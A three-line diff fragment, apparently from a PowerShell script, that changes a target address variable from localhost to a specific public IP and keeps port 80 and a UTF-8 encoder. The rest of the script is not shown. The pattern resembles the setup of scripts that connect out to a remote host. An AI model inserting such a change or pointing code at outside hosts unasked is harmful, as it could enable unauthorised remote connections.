@@ -1,4 +1,4 @@
-$daip = "localhost";
+$daip = "139.162.197.217";
 $daport = 80;
 $enc = [Text.Encoding]::UTF8
 
